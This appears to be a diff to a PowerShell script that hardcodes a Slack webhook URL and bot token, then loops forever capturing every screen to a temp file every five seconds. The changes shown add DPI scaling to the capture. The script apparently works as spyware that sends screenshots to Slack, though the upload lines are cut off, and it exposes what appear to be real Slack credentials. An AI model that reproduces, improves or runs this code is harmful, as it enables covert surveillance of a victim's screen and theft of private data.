@@ -3,7 +3,6 @@ $swbt='https://hooks.slack.com/services/T08F0' + '53J6G5/B08FXT4AHU0/MhBJ6ZQkjW5
 $sat = "xoxb-8510173618549-855156999" + "8048-9VGiG8Blv8C7OABqVo9xP9m5"
 
 while(1){
-
   Add-Type -AssemblyName System.Windows.Forms,System.Drawing
 
   $screens = [Windows.Forms.Screen]::AllScreens
@@ -13,17 +12,23 @@ while(1){
   $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
   $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
 
-  $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
-  $bmp      = New-Object -TypeName System.Drawing.Bitmap -ArgumentList ([int]$bounds.width), ([int]$bounds.height)
+  $bounds = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
+  
+  $bmp = New-Object System.Drawing.Bitmap ($bounds.Width, $bounds.Height)
   $graphics = [Drawing.Graphics]::FromImage($bmp)
 
-  $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
+  $dpiX = $graphics.DpiX / 96.0
+  $dpiY = $graphics.DpiY / 96.0
 
+  $scaledBounds = New-Object Drawing.Rectangle (0, 0, [int]($bounds.Width * $dpiX), [int]($bounds.Height * $dpiY))
+  
+  $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $scaledBounds.Size)
+  
   $bmp.Save("$env:USERPROFILE\AppData\Local\Temp\crab.png")
   $graphics.Dispose()
   $bmp.Dispose()
-  
-  start-sleep -Seconds 5
+
+  Start-Sleep -Seconds 5
 
   try { $ffp = Join-Path -Path $env:USERPROFILE -ChildPath '\AppData\Local\Temp\crab.png' } catch {}
   if (Test-Path $ffp) {
